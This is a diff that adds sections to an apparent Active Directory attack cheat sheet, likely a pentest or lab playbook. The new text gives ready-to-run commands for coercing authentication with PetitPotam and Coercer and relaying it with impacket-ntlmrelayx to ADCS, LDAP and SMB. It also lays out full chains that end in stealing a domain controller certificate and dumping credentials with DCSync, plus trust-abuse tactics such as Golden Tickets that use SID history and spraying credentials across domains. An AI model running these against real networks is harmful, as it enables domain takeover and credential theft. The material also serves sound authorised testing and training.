@@ -106,6 +106,78 @@ mimikatz # misc::skeleton
 # No native remote skeleton key; requires code exec on DC first
 ```
 
+## NTLM Relay Attacks (coercion + relay)
+Coerce a machine account to authenticate to your relay listener, then relay
+that authentication to perform an action the machine account is authorized for.
+
+### Coercion tools (trigger the callback)
+```bash
+# PetitPotam (MS-EFSRPC) — most common, works unauthenticated on unpatched DCs
+petitpotam.py <LISTENER> <TARGET>
+petitpotam.py -u <user> -p '<pass>' -d <dom> <LISTENER> <TARGET>
+
+# Coercer (wraps PetitPotam + PrinterBug + DFSCoerce + ShadowCoerce + more)
+coercer coerce -l <LISTENER> -t <TARGET>                           # unauthenticated
+coercer coerce -l <LISTENER> -t <TARGET> -u <user> -p '<pass>' -d <dom>  # authenticated
+coercer scan -t <TARGET> -u <user> -p '<pass>' -d <dom>           # check which methods work
+```
+
+### Relay targets (what to do with the coerced auth)
+```bash
+# Relay to ADCS HTTP enrollment (ESC8) — get a cert as the machine account
+impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template Machine
+
+# Relay to LDAP for shadow credentials (write msDS-KeyCredentialLink)
+impacket-ntlmrelayx -t ldap://<DC> --shadow-credentials --shadow-target <TARGET>$
+
+# Relay to LDAP for RBCD (write msDS-AllowedToActOnBehalfOfOtherIdentity)
+impacket-ntlmrelayx -t ldap://<DC> --delegate-access --escalate-user <CONTROLLED>$
+
+# Relay to SMB for secretsdump
+impacket-ntlmrelayx -t smb://<TARGET> -smb2support -c 'whoami'
+```
+
+### Relay chain examples
+```bash
+# ESC8: coerce DC -> relay to CA -> get DC cert -> DCSync
+impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController &
+petitpotam.py <LHOST> <DC>
+# Then: certipy auth -pfx <dc>.pfx -dc-ip <DC>
+# Then: impacket-secretsdump -k -no-pass <DC-FQDN>
+
+# Shadow credentials via relay: coerce target -> relay to DC LDAP
+impacket-ntlmrelayx -t ldap://<DC> --shadow-credentials --shadow-target <TARGET>$ &
+coercer coerce -l <LHOST> -t <TARGET> -u <user> -p '<pass>' -d <dom>
+# Then: certipy auth -pfx <target>.pfx -dc-ip <DC>
+```
+
+Requirements: LDAP signing disabled (for LDAP relay), SMB signing disabled (for SMB relay), HTTP on CA (for ADCS relay). Check with:
+```bash
+nxc smb <TARGET> --gen-relay-list relay-targets.txt    # SMB signing off
+nxc ldap <DC> -u <user> -p '<pass>' -M ldap-checker    # LDAP signing/channel binding
+```
+
+## Cross-Domain Trust Abuse
+On multi-domain networks, trust relationships are attack paths:
+
+### Enumeration
+```bash
+# Trust relationships
+nxc smb <DC> -u <user> -p '<pass>' -M enum_trusts
+# Or from BloodHound domain JSON
+jq '.data[].Trusts[]' loot/bloodhound/*domains*.json
+```
+
+### Inter-forest / cross-domain attacks
+- **SID History across trusts**: if SID filtering is disabled, forge a Golden
+  Ticket with the Enterprise Admins SID of the parent domain
+- **Kerberos delegation across trusts**: constrained delegation targets in
+  another domain can be abused via S4U2proxy
+- **Foreign group membership**: users from Domain A in groups in Domain B —
+  check with BloodHound or `ldapsearch`
+- **Shared credentials**: spray every credential across ALL domains — password
+  reuse across trust boundaries is extremely common in labs
+
 ## Cross-references (keyword activation)
 - **Pass-the-Hash (PtH)**: see `@windows` lateral-movement.md — Evil-WinRM
   `-H`, impacket `-hashes`, nxc `-H`
